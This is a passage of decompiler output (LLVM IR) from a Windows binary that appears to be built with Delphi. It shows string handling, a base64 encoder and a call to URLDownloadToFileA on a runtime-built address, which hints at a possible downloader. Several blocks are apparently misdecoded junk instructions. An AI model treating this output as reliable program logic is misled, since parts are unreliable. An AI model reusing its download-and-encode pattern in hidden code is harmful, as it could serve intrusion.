  %21 = shl i32 1, %20, !insn.addr !495
  %22 = and i32 %18, %21, !insn.addr !495
  %23 = icmp ne i32 %22, 0, !insn.addr !495
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !495
  br label %dec_label_pc_404bed, !insn.addr !495

dec_label_pc_404bed:                              ; preds = %dec_label_pc_404bd6, %dec_label_pc_404be3
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !496
  br i1 %24, label %dec_label_pc_404c44, label %dec_label_pc_404bef, !insn.addr !496

dec_label_pc_404bef:                              ; preds = %dec_label_pc_404bed, %dec_label_pc_404bcc
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !497
  %27 = add i32 %esp.0.reload, -4, !insn.addr !498
  %28 = inttoptr i32 %27 to i32*, !insn.addr !498
  store i32 %26, i32* %28, align 4, !insn.addr !498
  %29 = add i32 %esp.0.reload, -8, !insn.addr !499
  %30 = inttoptr i32 %29 to i32*, !insn.addr !499
  store i32 ptrtoint (i32* @global_var_404cb8 to i32), i32* %30, align 4, !insn.addr !499
  %31 = call i32 @function_404b4c(), !insn.addr !500
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !501
  %33 = add i32 %esp.0.reload, -12, !insn.addr !502
  %34 = inttoptr i32 %33 to i32*, !insn.addr !502
  store i32 0, i32* %34, align 4, !insn.addr !502
  %35 = call i32 @function_404b4c(), !insn.addr !503
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !504
  %37 = add i32 %esp.0.reload, -16, !insn.addr !505
  %38 = inttoptr i32 %37 to i32*, !insn.addr !505
  store i32 0, i32* %38, align 4, !insn.addr !505
  %39 = call i32 @"@LStrCatN"(), !insn.addr !506
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !507
  br label %dec_label_pc_404c5d, !insn.addr !507

dec_label_pc_404c44:                              ; preds = %dec_label_pc_404bed
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !508
  %41 = call i32 @"@LStrCat"(), !insn.addr !509
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !509
  br label %dec_label_pc_404c5d, !insn.addr !509

dec_label_pc_404c5d:                              ; preds = %dec_label_pc_404c44, %dec_label_pc_404bef, %dec_label_pc_404bbb
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !510
  %43 = add i32 %esi.0.reload, -1, !insn.addr !511
  %44 = icmp eq i32 %43, 0, !insn.addr !511
  %45 = icmp eq i1 %44, false, !insn.addr !512
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !512
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !512
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !512
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !512
  br i1 %45, label %dec_label_pc_404bb1, label %dec_label_pc_404c65, !insn.addr !512

dec_label_pc_404c65:                              ; preds = %dec_label_pc_404c5d, %dec_label_pc_404b64
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !513
  %47 = load i32, i32* %46, align 4, !insn.addr !513
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !514
  %48 = add i32 %esp.2.reload, 8, !insn.addr !515
  %49 = inttoptr i32 %48 to i32*, !insn.addr !515
  store i32 4213903, i32* %49, align 4, !insn.addr !515
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !516
  %51 = call i32 @"@LStrClr"(), !insn.addr !517
  ret i32 %51, !insn.addr !518
}

define i32 @function_404c88() local_unnamed_addr {
dec_label_pc_404c88:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !519
  ret i32 %0, !insn.addr !519
}

define i32 @function_404c8d() local_unnamed_addr {
dec_label_pc_404c8d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !520
}

define i32 @function_404c8f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c8f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !521
}

define i32 @function_404cb3() local_unnamed_addr {
dec_label_pc_404cb3:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !522
  %2 = inttoptr i32 %0 to i32*, !insn.addr !522
  store i32 %1, i32* %2, align 4, !insn.addr !522
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !523
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !523
  %7 = add i8 %4, %6, !insn.addr !523
  %8 = inttoptr i32 %5 to i8*, !insn.addr !523
  store i8 %7, i8* %8, align 1, !insn.addr !523
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !524
  %10 = load i32, i32* %eax, align 4, !insn.addr !524
  %11 = udiv i32 %10, 256, !insn.addr !524
  %12 = trunc i32 %11 to i8, !insn.addr !524
  %13 = add i8 %9, %12, !insn.addr !524
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !524
  %14 = call i32 @function_4036b8(), !insn.addr !525
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !526
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !526
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !526
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !527
  %17 = call i32 @"@LStrCatN"(), !insn.addr !528
  %18 = call i32 @function_4036c8(), !insn.addr !529
  %19 = inttoptr i32 %18 to i32*, !insn.addr !530
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !530
  call void @__writefsdword(i32 0, i32 0), !insn.addr !531
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !532
  ret i32 %21, !insn.addr !533
}

define i32 @function_404cbc() local_unnamed_addr {
dec_label_pc_404cbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !534
  ret i32 %0, !insn.addr !534
}

define i32 @function_404d2f() local_unnamed_addr {
dec_label_pc_404d2f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !535
}

define i32 @function_404d31(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404d31:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !536
}

define i32 @function_404d3b() local_unnamed_addr {
dec_label_pc_404d3b:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !537
  %5 = inttoptr i32 %3 to i32*, !insn.addr !537
  store i32 %4, i32* %5, align 4, !insn.addr !537
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !538
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !538
  %10 = add i8 %7, %9, !insn.addr !538
  %11 = inttoptr i32 %8 to i8*, !insn.addr !538
  store i8 %10, i8* %11, align 1, !insn.addr !538
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !539
  %14 = udiv i32 %1, 256, !insn.addr !539
  %15 = trunc i32 %14 to i8, !insn.addr !539
  %16 = add i8 %13, %15, !insn.addr !539
  %17 = load i32, i32* %edi, align 4, !insn.addr !539
  %18 = inttoptr i32 %17 to i8*, !insn.addr !539
  store i8 %16, i8* %18, align 1, !insn.addr !539
  %19 = load i8, i8* %6, align 4, !insn.addr !540
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !540
  %22 = add i8 %19, %21, !insn.addr !540
  %23 = inttoptr i32 %20 to i8*, !insn.addr !540
  store i8 %22, i8* %23, align 1, !insn.addr !540
  %24 = add i32 %0, -117, !insn.addr !541
  %25 = inttoptr i32 %24 to i8*, !insn.addr !541
  %26 = load i8, i8* %25, align 1, !insn.addr !541
  %27 = trunc i32 %2 to i8, !insn.addr !541
  %28 = add i8 %26, %27, !insn.addr !541
  store i8 %28, i8* %25, align 1, !insn.addr !541
  %29 = trunc i32 %2 to i16, !insn.addr !542
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !542
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !543
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !543
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !543
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !544
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !545
  %34 = add i32 %33, 1, !insn.addr !545
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !545
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !546
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !547
  ret i32 0, !insn.addr !548
}

define i32 @function_404d69() local_unnamed_addr {
dec_label_pc_404d69:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !549
  ret i32 %0, !insn.addr !549
}

define i32 @function_404d6e() local_unnamed_addr {
dec_label_pc_404d6e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !550
}

define i32 @function_404d70(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d70:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !551
}

define i32 @function_404d74() local_unnamed_addr {
dec_label_pc_404d74:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !552
  %2 = add i32 %1, -1, !insn.addr !552
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !552
  ret i32 %0, !insn.addr !553
}

define i32 @function_404d7f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404d7f:
  %storemerge.reg2mem = alloca i32, !insn.addr !554
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !554
  %5 = inttoptr i32 %3 to i32*, !insn.addr !554
  store i32 %4, i32* %5, align 4, !insn.addr !554
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !555
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !555
  %10 = add i8 %7, %9, !insn.addr !555
  %11 = inttoptr i32 %8 to i8*, !insn.addr !555
  store i8 %10, i8* %11, align 1, !insn.addr !555
  %12 = load i32, i32* %eax, align 4, !insn.addr !556
  store i32 %arg1, i32* %eax, align 4, !insn.addr !557
  %13 = add i32 %12, 99, !insn.addr !558
  %14 = inttoptr i32 %13 to i64*, !insn.addr !558
  %15 = load i64, i64* %14, align 4, !insn.addr !558
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !558
  %17 = add i32 %16, -2, !insn.addr !559
  %18 = inttoptr i32 %17 to i16*, !insn.addr !559
  store i16 27241, i16* %18, align 2, !insn.addr !559
  %19 = mul i32 %2, 2, !insn.addr !560
  %20 = add i32 %2, 110, !insn.addr !560
  %21 = add i32 %20, %19, !insn.addr !560
  %22 = inttoptr i32 %21 to i32*, !insn.addr !560
  %23 = load i32, i32* %22, align 4, !insn.addr !560
  %24 = sext i32 %23 to i64, !insn.addr !560
  %25 = mul nsw i64 %24, 111, !insn.addr !560
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !560
  %28 = icmp eq i64 %25, %27, !insn.addr !560
  br i1 %28, label %dec_label_pc_404db1, label %dec_label_pc_404e20, !insn.addr !561

dec_label_pc_404db1:                              ; preds = %dec_label_pc_404d7f
  %29 = icmp eq i32 %0, 0, !insn.addr !562
  br i1 %29, label %dec_label_pc_404e28, label %dec_label_pc_404db5, !insn.addr !563

dec_label_pc_404db5:                              ; preds = %dec_label_pc_404db1
  %30 = icmp slt i32 %0, 0, !insn.addr !562
  br i1 %30, label %dec_label_pc_404e30, label %dec_label_pc_404db7, !insn.addr !564

dec_label_pc_404db7:                              ; preds = %dec_label_pc_404db5
  %31 = trunc i32 %0 to i8, !insn.addr !562
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !565, !insn.addr !562
  %33 = and i8 %32, 1, !insn.addr !562
  %34 = icmp eq i8 %33, 0, !insn.addr !562
  br i1 %34, label %dec_label_pc_404de9, label %dec_label_pc_404db9, !insn.addr !566

dec_label_pc_404db9:                              ; preds = %dec_label_pc_404db7
  %35 = add i32 %12, -1, !insn.addr !556
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !567
  %37 = load i32, i32* %36, align 4, !insn.addr !567
  %38 = xor i32 %37, %1, !insn.addr !567
  store i32 %38, i32* %36, align 4, !insn.addr !567
  %39 = add i32 %1, 959985462, !insn.addr !568
  %40 = inttoptr i32 %39 to i32*, !insn.addr !568
  %41 = load i32, i32* %40, align 4, !insn.addr !568
  %42 = xor i32 %41, %1, !insn.addr !568
  %43 = add i32 %16, -38, !insn.addr !569
  %44 = inttoptr i32 %43 to i32*, !insn.addr !569
  store i32 %35, i32* %44, align 4, !insn.addr !569
  %45 = add i32 %16, -42, !insn.addr !570
  %46 = inttoptr i32 %45 to i32*, !insn.addr !570
  store i32 %42, i32* %46, align 4, !insn.addr !570
  %47 = add i32 %16, -22, !insn.addr !571
  %48 = inttoptr i32 %47 to i32*, !insn.addr !571
  store i32 0, i32* %48, align 4, !insn.addr !571
  %49 = add i32 %16, -26, !insn.addr !572
  %50 = inttoptr i32 %49 to i32*, !insn.addr !572
  store i32 0, i32* %50, align 4, !insn.addr !572
  %51 = add i32 %16, -30, !insn.addr !573
  %52 = inttoptr i32 %51 to i32*, !insn.addr !573
  store i32 0, i32* %52, align 4, !insn.addr !573
  %53 = add i32 %16, -34, !insn.addr !574
  %54 = inttoptr i32 %53 to i32*, !insn.addr !574
  store i32 0, i32* %54, align 4, !insn.addr !574
  %55 = add i32 %16, -6, !insn.addr !575
  %56 = inttoptr i32 %55 to i32*, !insn.addr !575
  store i32 %arg3, i32* %56, align 4, !insn.addr !575
  %57 = add i32 %16, -46, !insn.addr !576
  %58 = inttoptr i32 %57 to i32*, !insn.addr !576
  store i32 %17, i32* %58, align 4, !insn.addr !576
  ret i32 0, !insn.addr !576

dec_label_pc_404de9:                              ; preds = %dec_label_pc_404db7
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !577
  %60 = trunc i64 %25 to i32, !insn.addr !560
  %61 = load i32, i32* %eax, align 4, !insn.addr !578
  %62 = add i32 %61, 1, !insn.addr !578
  %63 = mul i32 %59, 8, !insn.addr !579
  %64 = add i32 %59, 48, !insn.addr !579
  %65 = add i32 %64, %63, !insn.addr !579
  %66 = inttoptr i32 %65 to i8*, !insn.addr !579
  %67 = load i8, i8* %66, align 4, !insn.addr !579
  %68 = udiv i32 %62, 256, !insn.addr !579
  %69 = trunc i32 %68 to i8, !insn.addr !579
  %70 = add i8 %67, %69, !insn.addr !579
  store i8 %70, i8* %66, align 4, !insn.addr !579
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !580
  %71 = call i32 @"@LStrClr"(), !insn.addr !581
  %72 = call i32 @function_4034c8(), !insn.addr !582
  %73 = add i32 %60, -8, !insn.addr !583
  %74 = inttoptr i32 %73 to i32*, !insn.addr !583
  store i32 %72, i32* %74, align 4, !insn.addr !583
  %75 = ashr i32 %72, 31, !insn.addr !584
  %76 = zext i32 %72 to i64, !insn.addr !585
  %77 = zext i32 %75 to i64, !insn.addr !585
  %78 = mul i64 %77, 4294967296, !insn.addr !585
  %79 = or i64 %78, %76, !insn.addr !585
  %80 = sdiv i64 %79, 3, !insn.addr !585
  %81 = trunc i64 %80 to i32, !insn.addr !585
  store i32 %81, i32* %eax, align 4, !insn.addr !585
  %82 = srem i64 %79, 3, !insn.addr !585
  %83 = trunc i64 %82 to i32, !insn.addr !585
  %84 = icmp eq i32 %83, 0, !insn.addr !586
  %85 = icmp eq i1 %84, false, !insn.addr !587
  br i1 %85, label %dec_label_pc_404e1f, label %dec_label_pc_404e12, !insn.addr !587

dec_label_pc_404e12:                              ; preds = %dec_label_pc_404de9
  %86 = load i32, i32* %74, align 4, !insn.addr !588
  %87 = ashr i32 %86, 31, !insn.addr !589
  %88 = zext i32 %86 to i64, !insn.addr !590
  %89 = zext i32 %87 to i64, !insn.addr !590
  %90 = mul i64 %89, 4294967296, !insn.addr !590
  %91 = or i64 %90, %88, !insn.addr !590
  %92 = sdiv i64 %91, 3, !insn.addr !590
  %93 = trunc i64 %92 to i32, !insn.addr !590
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !591
  br label %dec_label_pc_404e2c, !insn.addr !591

dec_label_pc_404e1f:                              ; preds = %dec_label_pc_404de9
  ret i32 %81, !insn.addr !591

dec_label_pc_404e20:                              ; preds = %dec_label_pc_404d7f
  %94 = load i32, i32* %eax, align 4, !insn.addr !592
  ret i32 %94, !insn.addr !592

dec_label_pc_404e28:                              ; preds = %dec_label_pc_404db1
  %95 = load i32, i32* %eax, align 4, !insn.addr !593
  %96 = zext i32 %95 to i64, !insn.addr !593
  %97 = zext i32 %arg3 to i64, !insn.addr !593
  %98 = mul i64 %97, 4294967296, !insn.addr !593
  %99 = or i64 %98, %96, !insn.addr !593
  %100 = zext i32 %arg2 to i64, !insn.addr !593
  %101 = sdiv i64 %99, %100, !insn.addr !593
  %102 = trunc i64 %101 to i32, !insn.addr !593
  %103 = add i32 %102, 1, !insn.addr !594
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !594
  br label %dec_label_pc_404e2c, !insn.addr !594

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404e12, %dec_label_pc_404e28
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !595
  ret i32 %104, !insn.addr !596

dec_label_pc_404e30:                              ; preds = %dec_label_pc_404db5
  %105 = inttoptr i32 %1 to i32*, !insn.addr !597
  %106 = load i32, i32* %105, align 4, !insn.addr !597
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !597
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !598
  %109 = load i32, i32* %108, align 4, !insn.addr !598
  %110 = add i32 %109, %107, !insn.addr !598
  store i32 %110, i32* %108, align 4, !insn.addr !598
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !599
  %113 = inttoptr i32 %112 to i8*, !insn.addr !599
  %114 = load i8, i8* %113, align 1, !insn.addr !599
  %115 = trunc i32 %111 to i8, !insn.addr !599
  %116 = add i8 %114, %115, !insn.addr !599
  store i8 %116, i8* %113, align 1, !insn.addr !599
  %117 = load i32, i32* %eax, align 4, !insn.addr !600
  ret i32 %117, !insn.addr !600
}

define i32 @function_404e38() local_unnamed_addr {
dec_label_pc_404e38:
  %ebx.0.reg2mem = alloca i32, !insn.addr !601
  %esp.0.reg2mem = alloca i32, !insn.addr !601
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !602
  %3 = inttoptr i32 %2 to i32*, !insn.addr !602
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !603
  %13 = inttoptr i32 %12 to i32*, !insn.addr !603
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !601
  br label %dec_label_pc_404e3a, !insn.addr !601

dec_label_pc_404e3a:                              ; preds = %dec_label_pc_404f85, %dec_label_pc_404e38
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !604
  %25 = add i32 %24, 3, !insn.addr !605
  %26 = load i32, i32* %3, align 4, !insn.addr !602
  %27 = icmp sgt i32 %25, %26, !insn.addr !606
  br i1 %27, label %dec_label_pc_404eda, label %dec_label_pc_404e4b, !insn.addr !606

dec_label_pc_404e4b:                              ; preds = %dec_label_pc_404e3a
  %28 = add i32 %24, %0, !insn.addr !607
  %29 = inttoptr i32 %28 to i8*, !insn.addr !607
  %30 = load i8, i8* %29, align 1, !insn.addr !607
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !608
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !609
  %34 = inttoptr i32 %33 to i8*, !insn.addr !609
  %35 = load i8, i8* %34, align 1, !insn.addr !609
  store i8 %35, i8* %5, align 1, !insn.addr !610
  %36 = load i8, i8* %29, align 1, !insn.addr !611
  %37 = mul i8 %36, 16, !insn.addr !612
  %38 = and i8 %37, 48, !insn.addr !613
  %39 = add i32 %28, 1, !insn.addr !614
  %40 = inttoptr i32 %39 to i8*, !insn.addr !614
  %41 = load i8, i8* %40, align 1, !insn.addr !614
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !615
  %44 = zext i8 %43 to i32, !insn.addr !615
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !616
  %46 = inttoptr i32 %45 to i8*, !insn.addr !616
  %47 = load i8, i8* %46, align 1, !insn.addr !616
  store i8 %47, i8* %7, align 1, !insn.addr !617
  %48 = load i8, i8* %40, align 1, !insn.addr !618
  %49 = mul i8 %48, 4, !insn.addr !619
  %50 = and i8 %49, 60, !insn.addr !620
  %51 = add i32 %28, 2, !insn.addr !621
  %52 = inttoptr i32 %51 to i8*, !insn.addr !621
  %53 = load i8, i8* %52, align 1, !insn.addr !621
  %54 = udiv i8 %53, 64, !insn.addr !622
  %55 = or i8 %54, %50, !insn.addr !623
  %56 = zext i8 %55 to i32, !insn.addr !623
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !624
  %58 = inttoptr i32 %57 to i8*, !insn.addr !624
  %59 = load i8, i8* %58, align 1, !insn.addr !624
  store i8 %59, i8* %9, align 1, !insn.addr !625
  %60 = and i8 %53, 63, !insn.addr !626
  %61 = zext i8 %60 to i32, !insn.addr !626
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !627
  %63 = inttoptr i32 %62 to i8*, !insn.addr !627
  %64 = load i8, i8* %63, align 1, !insn.addr !627
  store i8 %64, i8* %11, align 1, !insn.addr !628
  br label %dec_label_pc_404f85, !insn.addr !629

dec_label_pc_404eda:                              ; preds = %dec_label_pc_404e3a
  %65 = add i32 %24, 2, !insn.addr !630
  %66 = icmp sgt i32 %65, %26, !insn.addr !631
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_404f49, label %dec_label_pc_404ee4, !insn.addr !631

dec_label_pc_404ee4:                              ; preds = %dec_label_pc_404eda
  %76 = mul i8 %75, 16, !insn.addr !632
  %77 = and i8 %76, 48, !insn.addr !633
  %78 = add i32 %67, 1, !insn.addr !634
  %79 = inttoptr i32 %78 to i8*, !insn.addr !634
  %80 = load i8, i8* %79, align 1, !insn.addr !634
  %81 = zext i8 %80 to i32, !insn.addr !634
  %82 = udiv i8 %80, 16, !insn.addr !635
  %83 = or i8 %82, %77, !insn.addr !636
  %84 = zext i8 %83 to i32, !insn.addr !636
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !637
  %86 = inttoptr i32 %85 to i8*, !insn.addr !637
  %87 = load i8, i8* %86, align 1, !insn.addr !637
  store i8 %87, i8* %7, align 1, !insn.addr !638
  %88 = mul i32 %81, 4, !insn.addr !639
  %89 = and i32 %88, 60, !insn.addr !640
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !641
  %91 = inttoptr i32 %90 to i8*, !insn.addr !641
  %92 = load i8, i8* %91, align 4, !insn.addr !641
  store i8 %92, i8* %9, align 1, !insn.addr !642
  store i8 61, i8* %11, align 1, !insn.addr !643
  br label %dec_label_pc_404f85, !insn.addr !644

dec_label_pc_404f49:                              ; preds = %dec_label_pc_404eda
  %93 = zext i8 %75 to i32, !insn.addr !645
  %94 = mul i32 %93, 16, !insn.addr !646
  %95 = and i32 %94, 48, !insn.addr !647
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !648
  %97 = inttoptr i32 %96 to i8*, !insn.addr !648
  %98 = load i8, i8* %97, align 16, !insn.addr !648
  store i8 %98, i8* %7, align 1, !insn.addr !649
  store i8 61, i8* %9, align 1, !insn.addr !650
  store i8 61, i8* %11, align 1, !insn.addr !651
  br label %dec_label_pc_404f85, !insn.addr !651

dec_label_pc_404f85:                              ; preds = %dec_label_pc_404f49, %dec_label_pc_404ee4, %dec_label_pc_404e4b
  %99 = load i32, i32* %13, align 4, !insn.addr !603
  %100 = inttoptr i32 %99 to i32*, !insn.addr !652
  %101 = load i32, i32* %100, align 4, !insn.addr !652
  %102 = add i32 %esp.0.reload, -4, !insn.addr !652
  %103 = inttoptr i32 %102 to i32*, !insn.addr !652
  store i32 %101, i32* %103, align 4, !insn.addr !652
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !653
  %105 = load i32, i32* %15, align 4, !insn.addr !654
  %106 = add i32 %esp.0.reload, -8, !insn.addr !654
  %107 = inttoptr i32 %106 to i32*, !insn.addr !654
  store i32 %105, i32* %107, align 4, !insn.addr !654
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !655
  %109 = load i32, i32* %17, align 4, !insn.addr !656
  %110 = add i32 %esp.0.reload, -12, !insn.addr !656
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !656
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !657
  %113 = load i32, i32* %19, align 4, !insn.addr !658
  %114 = add i32 %esp.0.reload, -16, !insn.addr !658
  %115 = inttoptr i32 %114 to i32*, !insn.addr !658
  store i32 %113, i32* %115, align 4, !insn.addr !658
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !659
  %117 = load i32, i32* %21, align 4, !insn.addr !660
  %118 = add i32 %esp.0.reload, -20, !insn.addr !660
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !660
  %120 = call i32 @"@LStrCatN"(), !insn.addr !661
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !662
  %122 = load i32, i32* %23, align 4, !insn.addr !663
  %123 = add i32 %122, -1, !insn.addr !663
  %124 = icmp eq i32 %123, 0, !insn.addr !663
  store i32 %123, i32* %23, align 4, !insn.addr !663
  %125 = icmp eq i1 %124, false, !insn.addr !664
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !664
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !664
  br i1 %125, label %dec_label_pc_404e3a, label %dec_label_pc_404fd9, !insn.addr !664

dec_label_pc_404fd9:                              ; preds = %dec_label_pc_404f85
  %126 = load i32, i32* %119, align 4, !insn.addr !665
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !666
  store i32 4214779, i32* %111, align 4, !insn.addr !667
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !668
  ret i32 %127, !insn.addr !669
}

define i32 @function_404ff4() local_unnamed_addr {
dec_label_pc_404ff4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !670
  ret i32 %0, !insn.addr !670
}

define i32 @function_404ff9() local_unnamed_addr {
dec_label_pc_404ff9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !671
}

define i32 @function_404ffb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404ffb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !672
}

define i32 @function_405004() local_unnamed_addr {
dec_label_pc_405004:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !673
  %0 = call i32 @function_4036c8(), !insn.addr !674
